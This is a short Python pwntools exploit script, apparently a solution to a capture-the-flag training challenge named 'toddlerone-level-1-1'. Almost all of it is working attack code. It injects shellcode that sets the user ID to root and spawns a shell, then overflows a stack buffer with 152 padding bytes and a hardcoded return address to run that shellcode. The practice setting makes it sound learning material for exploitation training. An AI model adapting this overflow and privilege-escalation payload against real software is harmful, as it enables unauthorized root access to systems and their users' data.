from pwn import *


addr_shellcode = p64(0x1ab39000)
offset = 152
proc = process('/challenge/toddlerone-level-1-1')
proc.recv()
context.arch = 'amd64'
# Set UID = 0 (root) --> does not drop priv
shellcode = asm(
    "mov rax, 105\n"
    "mov rdi, 0\n"    
    "syscall\n"
)
shellcode += asm(shellcraft.sh())
# shellcode = asm(shellcraft.setuid()) + asm(shellcraft.sh())
proc.sendline(shellcode)

proc.recv()
size = offset + 8
proc.sendline(str(size).encode())

proc.recv()
payload = b'A' * offset + addr_shellcode
proc.sendline(payload)
proc.interactive()

